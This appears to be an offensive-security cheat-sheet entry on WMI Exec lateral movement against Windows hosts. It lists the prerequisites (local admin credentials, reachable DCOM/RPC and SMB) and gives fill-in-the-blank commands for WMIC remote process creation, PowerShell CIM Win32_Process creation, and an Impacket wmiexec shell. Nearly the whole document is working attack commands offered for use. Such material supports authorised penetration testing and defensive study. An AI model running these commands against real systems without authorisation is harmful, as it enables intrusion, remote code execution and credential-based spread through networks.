---
technique: WMI Exec
category: lateral-movement
targets: Windows Hosts
protocols: WMI, DCOM, SMB
remote_capable: true
tags: windows lateral-movement wmi wmiexec impacket
---

# WMI Exec

WMI exec creates remote processes through WMI over DCOM and commonly returns output over SMB when using Impacket-style tooling.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Credentials | Local admin or equivalent rights on the target |
| Network access | DCOM/RPC and SMB must be reachable |
| Admin share | Output retrieval often uses administrative shares |

## Windows

### Remote process with WMIC

#cmd #wmi #lateral-movement

Create a remote process through WMIC.

```cmd title:"Create remote process with WMIC"
wmic /node:"$rhost_name" /user:"$user" /password:"$pass" process call create "$command"
```
<!-- cheat
var rhost_name
var user
var pass
var command
-->

### Remote process with PowerShell CIM

#powershell #wmi #lateral-movement

Create a remote process through CIM.

```powershell title:"Create remote process with CIM"
Invoke-CimMethod -ComputerName "$rhost_name" -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="$command"}
```
<!-- cheat
var rhost_name
var command
-->

## Linux

### Impacket wmiexec

#sh #impacket #wmi

Open a semi-interactive shell through Impacket wmiexec.

```sh title:"Run Impacket wmiexec"
impacket-wmiexec "$domain/$user:$pass@$rhost_ip"
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
-->
